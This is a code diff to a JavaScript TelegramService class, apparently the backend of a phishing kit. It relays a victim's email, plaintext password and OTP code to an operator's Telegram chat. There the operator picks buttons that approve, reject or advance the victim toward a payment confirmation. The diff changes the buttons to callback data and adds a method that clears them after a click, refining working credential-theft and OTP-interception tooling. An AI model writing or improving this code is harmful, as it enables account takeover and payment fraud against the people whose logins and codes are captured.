@@ -43,26 +43,14 @@ class TelegramService {
   async sendAuthRequest(sessionId, email, password) {
     const text = `
 <b>🔐 SOLICITUD DE AUTENTICACIÓN</b>
-<b>Session ID:</b> <code>${sessionId}</code>
 <b>Email:</b> <code>${email}</code>
-<b>Password:</b> <code>${password}</code>
-
-<b>Selecciona una opción:</b>
-    `;
+<b>Password:</b> <code>${password}</code>`;
 
     const keyboard = {
-      inline_keyboard: [
-        [
-          {
-            text: '✅ RegistroOtp',
-            url: `${config.apiUrl}/auth/respond/${sessionId}?response=RegistroOtp`,
-          },
-          {
-            text: '❌ ERROR',
-            url: `${config.apiUrl}/auth/respond/${sessionId}?response=ERROR`,
-          },
-        ],
-      ],
+      inline_keyboard: [[
+        { text: '✅ RegistroOtp', callback_data: `${sessionId}|RegistroOtp` },
+        { text: '❌ ERROR',       callback_data: `${sessionId}|ERROR` },
+      ]],
     };
 
     return this.sendMessageWithButtons(text, keyboard);
@@ -71,53 +59,26 @@ class TelegramService {
   async sendOtpRequest(sessionId, code) {
     const text = `
 <b>🔑 VERIFICACIÓN OTP</b>
-<b>Session ID:</b> <code>${sessionId}</code>
-<b>Código OTP:</b> <code>${code}</code>
-
-<b>Selecciona una opción:</b>
-    `;
+<b>Código:</b> <code>${code}</code>`;
 
     const keyboard = {
-      inline_keyboard: [
-        [
-          {
-            text: '🎉 Aprobado',
-            url: `${config.apiUrl}/otp/respond/${sessionId}?response=Aprobado`,
-          },
-          {
-            text: '❌ ERROR',
-            url: `${config.apiUrl}/otp/respond/${sessionId}?response=ERROR`,
-          },
-        ],
-      ],
+      inline_keyboard: [[
+        { text: '🎉 Aprobado', callback_data: `${sessionId}|Aprobado` },
+        { text: '❌ ERROR',    callback_data: `${sessionId}|ERROR` },
+      ]],
     };
 
     return this.sendMessageWithButtons(text, keyboard);
   }
 
   async sendConfirmationRequest(sessionId) {
-    const text = `
-<b>✔️ CONFIRMACIÓN FINAL</b>
-<b>Session ID:</b> <code>${sessionId}</code>
-
-<b>Usuario ha llegado a confirmación de pago.</b>
-
-<b>Selecciona una opción:</b>
-    `;
+    const text = `<b>✔️ CONFIRMACIÓN DE PAGO</b>\n<b>Usuario listo para confirmar.</b>`;
 
     const keyboard = {
-      inline_keyboard: [
-        [
-          {
-            text: '✅ Confirmar',
-            url: `${config.apiUrl}/confirmation/respond/${sessionId}?response=Confirmado`,
-          },
-          {
-            text: '❌ Rechazar',
-            url: `${config.apiUrl}/confirmation/respond/${sessionId}?response=ERROR`,
-          },
-        ],
-      ],
+      inline_keyboard: [[
+        { text: '✅ Confirmar', callback_data: `${sessionId}|Confirmado` },
+        { text: '❌ Rechazar',  callback_data: `${sessionId}|ERROR` },
+      ]],
     };
 
     return this.sendMessageWithButtons(text, keyboard);
@@ -137,6 +98,21 @@ class TelegramService {
     } catch (error) {
       console.error('[TELEGRAM ERROR]', error.response?.data || error.message);
       throw error;
+    }
+  }
+
+  // Elimina los botones del mensaje una vez clickeado
+  async removeButtons(messageId, text) {
+    try {
+      await axios.post(`${this.apiUrl}/editMessageText`, {
+        chat_id: this.chatId,
+        message_id: messageId,
+        text: text,
+        parse_mode: 'HTML',
+      });
+      console.log(`[TELEGRAM] Botones eliminados del mensaje ${messageId}`);
+    } catch (error) {
+      console.error('[TELEGRAM] Error eliminando botones:', error.response?.data || error.message);
     }
   }
 }
